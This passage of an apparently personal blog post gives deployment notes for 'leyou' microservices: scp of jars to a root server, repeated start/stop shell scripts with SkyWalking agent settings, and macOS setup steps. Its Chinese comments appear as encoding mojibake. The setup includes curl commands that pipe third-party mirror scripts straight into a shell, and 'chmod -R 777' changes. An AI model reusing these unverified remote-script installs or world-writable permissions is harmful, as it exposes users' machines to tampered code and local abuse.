&quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¾“å‡ºè¿è¡ŒçŠ¶æ€</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ ¹æ®è¾“å…¥å‚æ•°,é€‰æ‹©æ‰§è¡Œå¯¹åº”æ–¹æ³•,ä¸è¾“å…¥åˆ™æ‰§è¡Œä½¿ç”¨è¯´æ˜</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h3 id="Ly-qurtz"><a href="#Ly-qurtz" class="headerlink" title="Ly-qurtz"></a>Ly-qurtz</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">10030</span></span><br><span class="line">scp ly-qurtz-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-qurtz.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-qurtz.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¿™é‡Œå¯æ›¿æ¢ä¸ºä½ è‡ªå·±çš„æ‰§è¡Œç¨‹åº,å…¶ä»–ä»£ç æ— éœ€æ›´æ”¹</span> </span><br><span class="line">APP_NAME=ly-qurtz-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx256m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-qurtz -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-qurtz.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä½¿ç”¨è¯´æ˜,ç”¨æ¥æç¤ºè¾“å…¥å‚æ•°</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh æ‰§è¡Œè„šæœ¬.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ£€æŸ¥ç¨‹åºæ˜¯å¦åœ¨è¿è¡Œ</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœä¸å­˜åœ¨è¿”å›1,å­˜åœ¨è¿”å›0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨æ–¹æ³•</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœæ­¢æ–¹æ³•</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¾“å‡ºè¿è¡ŒçŠ¶æ€</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ ¹æ®è¾“å…¥å‚æ•°,é€‰æ‹©æ‰§è¡Œå¯¹åº”æ–¹æ³•,ä¸è¾“å…¥åˆ™æ‰§è¡Œä½¿ç”¨è¯´æ˜</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h3 id="Ly-search"><a href="#Ly-search" class="headerlink" title="Ly-search"></a>Ly-search</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">10010</span></span><br><span class="line">scp ly-search-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-search.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-search.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¿™é‡Œå¯æ›¿æ¢ä¸ºä½ è‡ªå·±çš„æ‰§è¡Œç¨‹åº,å…¶ä»–ä»£ç æ— éœ€æ›´æ”¹</span> </span><br><span class="line">APP_NAME=ly-search-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-search -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-search.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä½¿ç”¨è¯´æ˜,ç”¨æ¥æç¤ºè¾“å…¥å‚æ•°</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh æ‰§è¡Œè„šæœ¬.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ£€æŸ¥ç¨‹åºæ˜¯å¦åœ¨è¿è¡Œ</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœä¸å­˜åœ¨è¿”å›1,å­˜åœ¨è¿”å›0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨æ–¹æ³•</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœæ­¢æ–¹æ³•</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¾“å‡ºè¿è¡ŒçŠ¶æ€</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ ¹æ®è¾“å…¥å‚æ•°,é€‰æ‹©æ‰§è¡Œå¯¹åº”æ–¹æ³•,ä¸è¾“å…¥åˆ™æ‰§è¡Œä½¿ç”¨è¯´æ˜</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h3 id="ly-sms"><a href="#ly-sms" class="headerlink" title="ly-sms"></a>ly-sms</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">8075</span></span><br><span class="line">scp ly-sms-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-sms.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-sms.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¿™é‡Œå¯æ›¿æ¢ä¸ºä½ è‡ªå·±çš„æ‰§è¡Œç¨‹åº,å…¶ä»–ä»£ç æ— éœ€æ›´æ”¹</span> </span><br><span class="line">APP_NAME=ly-sms-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx300m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-sms -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-sms.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä½¿ç”¨è¯´æ˜,ç”¨æ¥æç¤ºè¾“å…¥å‚æ•°</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh æ‰§è¡Œè„šæœ¬.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ£€æŸ¥ç¨‹åºæ˜¯å¦åœ¨è¿è¡Œ</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœä¸å­˜åœ¨è¿”å›1,å­˜åœ¨è¿”å›0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨æ–¹æ³•</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœæ­¢æ–¹æ³•</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¾“å‡ºè¿è¡ŒçŠ¶æ€</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ ¹æ®è¾“å…¥å‚æ•°,é€‰æ‹©æ‰§è¡Œå¯¹åº”æ–¹æ³•,ä¸è¾“å…¥åˆ™æ‰§è¡Œä½¿ç”¨è¯´æ˜</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h3 id="Ly-trade"><a href="#Ly-trade" class="headerlink" title="Ly-trade"></a>Ly-trade</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">8087</span></span><br><span class="line">scp ly-trade-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-trade.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-trade.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¿™é‡Œå¯æ›¿æ¢ä¸ºä½ è‡ªå·±çš„æ‰§è¡Œç¨‹åº,å…¶ä»–ä»£ç æ— éœ€æ›´æ”¹</span> </span><br><span class="line">APP_NAME=ly-trade-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-trade -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-trade.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä½¿ç”¨è¯´æ˜,ç”¨æ¥æç¤ºè¾“å…¥å‚æ•°</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh æ‰§è¡Œè„šæœ¬.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ£€æŸ¥ç¨‹åºæ˜¯å¦åœ¨è¿è¡Œ</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœä¸å­˜åœ¨è¿”å›1,å­˜åœ¨è¿”å›0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨æ–¹æ³•</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœæ­¢æ–¹æ³•</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¾“å‡ºè¿è¡ŒçŠ¶æ€</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ ¹æ®è¾“å…¥å‚æ•°,é€‰æ‹©æ‰§è¡Œå¯¹åº”æ–¹æ³•,ä¸è¾“å…¥åˆ™æ‰§è¡Œä½¿ç”¨è¯´æ˜</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>

<h3 id="Ly-user-service"><a href="#Ly-user-service" class="headerlink" title="Ly-user-service"></a>Ly-user-service</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">8086</span></span><br><span class="line">scp ly-user-service-1.0-SNAPSHOT.jar root@mac-centos:/opt/leyou/</span><br><span class="line">scp application-product.yml root@mac-centos:/opt/leyou/config/application-ly-user-service.yml</span><br><span class="line"></span><br><span class="line">cd /opt/leyou</span><br><span class="line">vi ly-user-service.sh</span><br><span class="line"><span class="meta">#</span><span class="language-bash">!/bin/bash</span> </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¿™é‡Œå¯æ›¿æ¢ä¸ºä½ è‡ªå·±çš„æ‰§è¡Œç¨‹åº,å…¶ä»–ä»£ç æ— éœ€æ›´æ”¹</span> </span><br><span class="line">APP_NAME=ly-user-service-1.0-SNAPSHOT.jar </span><br><span class="line">JVM=&quot;-server -Xms128m -Xmx512m -XX:PermSize=64M -XX:MaxNewSize=128m -XX:MaxPermSize=128m -Djava.awt.headless=true -XX:+CMSClassUnloadingEnabled -XX:+CMSPermGenSweepingEnabled -javaagent:/opt/leyou/agent/skywalking-agent.jar -Dskywalking.agent.service_name=ly-user-service -Dskywalking.collector.backend_service=81.68.97.129:11800&quot;</span><br><span class="line">APPFILE_PATH=&quot;-Dspring.config.location=/opt/leyou/config/application-ly-user-service.yml&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">ä½¿ç”¨è¯´æ˜,ç”¨æ¥æç¤ºè¾“å…¥å‚æ•°</span> </span><br><span class="line">usage() &#123; </span><br><span class="line">echo &quot;Usage: sh æ‰§è¡Œè„šæœ¬.sh [start|stop|restart|status]&quot; </span><br><span class="line">exit 1 </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ£€æŸ¥ç¨‹åºæ˜¯å¦åœ¨è¿è¡Œ</span> </span><br><span class="line">is_exist()&#123; </span><br><span class="line">pid=`ps -ef|grep $APP_NAME|grep -v grep|awk &#x27;&#123;print $2&#125;&#x27; ` </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¦‚æœä¸å­˜åœ¨è¿”å›1,å­˜åœ¨è¿”å›0</span> </span><br><span class="line">if [ -z &quot;$&#123;pid&#125;&quot; ]; then </span><br><span class="line">return 1 </span><br><span class="line">else </span><br><span class="line">return 0 </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¯åŠ¨æ–¹æ³•</span> </span><br><span class="line">start()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is already running. pid=$&#123;pid&#125; .&quot; </span><br><span class="line">else </span><br><span class="line">nohup java $JVM -jar $APPFILE_PATH $APP_NAME &amp;</span><br><span class="line">fi</span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">åœæ­¢æ–¹æ³•</span> </span><br><span class="line">stop()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">kill -9 $pid </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is not running&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">è¾“å‡ºè¿è¡ŒçŠ¶æ€</span> </span><br><span class="line">status()&#123; </span><br><span class="line">is_exist </span><br><span class="line">if [ $? -eq &quot;0&quot; ]; then </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is running. Pid is $&#123;pid&#125;&quot; </span><br><span class="line">else </span><br><span class="line">echo &quot;$&#123;APP_NAME&#125; is NOT running.&quot; </span><br><span class="line">fi </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">é‡å¯</span> </span><br><span class="line">restart()&#123; </span><br><span class="line">stop </span><br><span class="line">start </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ ¹æ®è¾“å…¥å‚æ•°,é€‰æ‹©æ‰§è¡Œå¯¹åº”æ–¹æ³•,ä¸è¾“å…¥åˆ™æ‰§è¡Œä½¿ç”¨è¯´æ˜</span> </span><br><span class="line">case &quot;$1&quot; in </span><br><span class="line">&quot;start&quot;) </span><br><span class="line">start </span><br><span class="line">;; </span><br><span class="line">&quot;stop&quot;) </span><br><span class="line">stop </span><br><span class="line">;; </span><br><span class="line">&quot;status&quot;) </span><br><span class="line">status </span><br><span class="line">;; </span><br><span class="line">&quot;restart&quot;) </span><br><span class="line">restart </span><br><span class="line">;; </span><br><span class="line">*) </span><br><span class="line">usage </span><br><span class="line">;; </span><br><span class="line">esac</span><br></pre></td></tr></table></figure>



<h1 id="MACOS"><a href="#MACOS" class="headerlink" title="MACOS"></a>MACOS</h1><h2 id="å®‰è£…jdk8-2"><a href="#å®‰è£…jdk8-2" class="headerlink" title="å®‰è£…jdk8"></a>å®‰è£…jdk8</h2><p>ä¸‹è½½å®‰è£…åŒ…</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cd</span> /Library/Java/JavaVirtualMachines/jdk1.8.0_211.jdk/Contents/Home</span><br><span class="line">sudo vi .bash_profile</span><br><span class="line"><span class="built_in">export</span> JAVA_HOME=/Library/Java/JavaVirtualMachines/jdk1.8.0_211.jdk/Contents/Home</span><br><span class="line"><span class="built_in">source</span> .bash_profile</span><br><span class="line">java -version</span><br></pre></td></tr></table></figure>

<h2 id="å¯åŠ¨ç®¡ç†å‘˜é¡µé¢"><a href="#å¯åŠ¨ç®¡ç†å‘˜é¡µé¢" class="headerlink" title="å¯åŠ¨ç®¡ç†å‘˜é¡µé¢"></a>å¯åŠ¨ç®¡ç†å‘˜é¡µé¢</h2><h3 id="å®‰è£…brew"><a href="#å®‰è£…brew" class="headerlink" title="å®‰è£…brew"></a>å®‰è£…brew</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="language-bash">å®‰è£…</span></span><br><span class="line">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/Homebrew.sh)&quot;</span><br><span class="line"><span class="meta">#</span><span class="language-bash">å¸è½½</span></span><br><span class="line">/bin/zsh -c &quot;$(curl -fsSL https://gitee.com/cunkai/HomebrewCN/raw/master/HomebrewUninstall.sh)&quot;</span><br><span class="line">/bin/bash -c &quot;$(curl -fsSL https://cdn.jsdelivr.net/gh/ineo6/homebrew-install/uninstall.sh)&quot;</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="language-bash">è®¾ç½®é•œåƒæº</span></span><br><span class="line">git -C &quot;$(brew --repo)&quot; remote set-url origin https://mirrors.ustc.edu.cn/brew.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/core)&quot; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-core.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://mirrors.ustc.edu.cn/homebrew-cask.git</span><br><span class="line"></span><br><span class="line">brew update</span><br><span class="line"><span class="meta">#</span><span class="language-bash">æ¢å¤é•œåƒæº</span></span><br><span class="line">git -C &quot;$(brew --repo)&quot; remote set-url origin https://github.com/Homebrew/brew.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/core)&quot; remote set-url origin https://github.com/Homebrew/homebrew-core.git</span><br><span class="line"></span><br><span class="line">git -C &quot;$(brew --repo homebrew/cask)&quot; remote set-url origin https://github.com/Homebrew/homebrew-cask.git</span><br><span class="line"></span><br><span class="line">brew update</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"></span><br><span class="line">brew install nodejs</span><br><span class="line"><span class="meta">#</span><span class="language-bash">è·å–nodejsæ¨¡å—å®‰è£…ç›®å½•è®¿é—®æƒé™</span></span><br><span class="line">sudo chmod -R 777 /usr/local/lib/node_modules/</span><br><span class="line"></span><br><span class="line">npm install -g cnpm --registry=https://registry.npm.taobao.org</span><br><span class="line">cnpm install webpack -g</span><br><span class="line">cnpm install vue-cli -g</span><br><span class="line"></span><br><span class="line">cd leyou-manage</span><br><span class="line">npm run serve</span><br></pre></td></tr></table></figure>

<p>VUE é¡¹ç›®æŠ¥é”™:sh: &#x2F;Users&#x2F;huangmingwang&#x2F;leyou-manage&#x2F;node_modules&#x2F;.bin&#x2F;vue-cli-service: Permission denied</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">chmod 777 /Users/huangmingwang/leyou-manage/node_modules/.bin/vue-cli-service</span><br><span class="line">cd /Users/huangmingwang/leyou/leyou-manage</span><br><span class="line">npm run serve</span><br></pre></td></tr></table></figure>

